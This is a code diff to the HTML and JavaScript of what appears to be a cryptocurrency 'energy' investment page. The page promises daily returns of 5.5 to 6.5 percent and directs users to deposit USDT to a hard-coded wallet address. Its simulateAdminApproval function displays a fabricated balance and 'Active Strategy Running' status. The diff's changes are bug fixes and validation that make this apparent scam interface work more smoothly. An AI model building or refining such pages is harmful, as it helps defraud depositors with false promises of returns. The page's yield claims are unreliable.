@@ -163,15 +163,15 @@
       <h3 style="margin-top:0; font-size:16px; text-align:left; color:#a0aec0;">📈 Daily Return Tiers</h3>
       
       <!-- Tiers Selection -->
-      <div class="tier-box selected" onclick="setTierAmount(1, 5.5)">
+      <div class="tier-box selected" onclick="setTierAmount(event, 1, 5.5)">
         <div style="display:flex; align-items:center;"><div class="tier-num">1</div> <div><div style="font-size:11px; color:#a0aec0;">Amount</div><div style="font-weight:bold; font-size:13px;">>= $0</div></div></div>
         <div style="text-align:right;"><div style="font-size:11px; color:#a0aec0;">Return</div><div style="color:var(--accent-green); font-weight:bold;">5.5%</div></div>
       </div>
-      <div class="tier-box" onclick="setTierAmount(20, 6.0)">
+      <div class="tier-box" onclick="setTierAmount(event, 20, 6.0)">
         <div style="display:flex; align-items:center;"><div class="tier-num">2</div> <div><div style="font-size:11px; color:#a0aec0;">Amount</div><div style="font-weight:bold; font-size:13px;">>= $20</div></div></div>
         <div style="text-align:right;"><div style="font-size:11px; color:#a0aec0;">Return</div><div style="color:var(--accent-green); font-weight:bold;">6.0%</div></div>
       </div>
-      <div class="tier-box" onclick="setTierAmount(300, 6.5)">
+      <div class="tier-box" onclick="setTierAmount(event, 300, 6.5)">
         <div style="display:flex; align-items:center;"><div class="tier-num">3</div> <div><div style="font-size:11px; color:#a0aec0;">Amount</div><div style="font-weight:bold; font-size:13px;">>= $300</div></div></div>
         <div style="text-align:right;"><div style="font-size:11px; color:#a0aec0;">Return</div><div style="color:var(--accent-green); font-weight:bold;">6.5%</div></div>
       </div>
@@ -179,14 +179,14 @@
       <div style="text-align:left; font-size:12px; color:#a0aec0; margin-top:10px;">YOU WANT TO BUY THE QUANTITY</div>
       <div class="input-amount-box">
         <span style="color:var(--accent-green); font-weight:bold;">₮</span>
-        <input type="number" id="depositAmountInput" placeholder="Min $1 USDT" value="1" oninput="calculateReturns()">
+        <input type="number" id="depositAmountInput" placeholder="Min $1 USDT" value="" oninput="calculateReturns()">
       </div>
 
       <div style="text-align:left; font-size:11px; color:#a0aec0;">ESTIMATED RETURN:</div>
       <div class="return-grid-white">
-        <div class="return-card-w"><div>DAILY</div><div id="calcDaily">$0.05</div></div>
-        <div class="return-card-w"><div>20 DAYS</div><div id="calc20Days">$1.10</div></div>
-        <div class="return-card-w"><div>PROFIT</div><div id="calcProfit">$0.10</div></div>
+        <div class="return-card-w"><div>DAILY</div><div id="calcDaily">$0.00</div></div>
+        <div class="return-card-w"><div>20 DAYS</div><div id="calc20Days">$0.00</div></div>
+        <div class="return-card-w"><div>PROFIT</div><div id="calcProfit">$0.00</div></div>
       </div>
 
       <button class="btn-action" style="background:#2196f3; width:100%; margin-top:10px;" onclick="proceedToDepositQR()">Continue</button>
@@ -255,21 +255,24 @@
     }
 
     function openBuyEnergyModal() {
-      document.getElementById('buyEnergyModal').style.display = 'flex';
+      document.getElementById('depositAmountInput').value = '';
       calculateReturns();
+      document.getElementById('buyEnergyModal').style.display = 'flex';
     }
 
     function closeModal(modalId) {
       document.getElementById(modalId).style.display = 'none';
     }
 
-    function setTierAmount(amount, rate) {
+    function setTierAmount(e, amount, rate) {
       document.getElementById('depositAmountInput').value = amount;
       currentReturnRate = rate;
       
       const boxes = document.querySelectorAll('.tier-box');
       boxes.forEach(b => b.classList.remove('selected'));
-      event.currentTarget.classList.add('selected');
+      if (e && e.currentTarget) {
+        e.currentTarget.classList.add('selected');
+      }
       
       calculateReturns();
     }
@@ -286,6 +289,11 @@
     }
 
     function proceedToDepositQR() {
+      const val = parseFloat(document.getElementById('depositAmountInput').value);
+      if (!val || val <= 0) {
+        alert('Please enter a valid amount to deposit before continuing.');
+        return;
+      }
       closeModal('buyEnergyModal');
       const address = "0xbC3C28ff9d531eC29302c36087544e6034412BA6";
       document.getElementById('depositQR').src = "https://api.qrserver.com/v1/create-qr-code/?size=140x140&data=" + address;
@@ -294,17 +302,24 @@
 
     function copyWalletAddress() {
       const addressText = document.getElementById('walletAddressText').innerText;
-      navigator.clipboard.writeText(addressText).then(() => {
-        alert('Deposit address copied to clipboard!');
-      });
+      if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(addressText).then(() => {
+          alert('Deposit address copied to clipboard!');
+        }).catch(() => {
+          alert('Copied: ' + addressText);
+        });
+      } else {
+        alert('Deposit Address: ' + addressText);
+      }
     }
 
     function simulateAdminApproval() {
-      const amount = document.getElementById('depositAmountInput').value;
+      const amountInput = document.getElementById('depositAmountInput').value;
+      const numAmount = parseFloat(amountInput) || 0;
       closeModal('depositAddressModal');
       
-      document.getElementById('display-balance').innerText = '₮ ' + parseFloat(amount).toFixed(3);
-      document.getElementById('display-daily').innerText = 'Daily Earn: $' + (amount * (currentReturnRate / 100)).toFixed(3) + ' (' + currentReturnRate + '%)';
+      document.getElementById('display-balance').innerText = '₮ ' + numAmount.toFixed(3);
+      document.getElementById('display-daily').innerText = 'Daily Earn: $' + (numAmount * (currentReturnRate / 100)).toFixed(3) + ' (' + currentReturnRate + '%)';
       document.getElementById('display-status').innerText = 'Status: Active Strategy Running';
       document.getElementById('trade-pct').innerText = currentReturnRate.toFixed(2) + '%';
       
@@ -312,5 +327,5 @@
     }
   </script>
 </body>
-        </html>
-  
+          </html>
+                                                                                                                                                                     
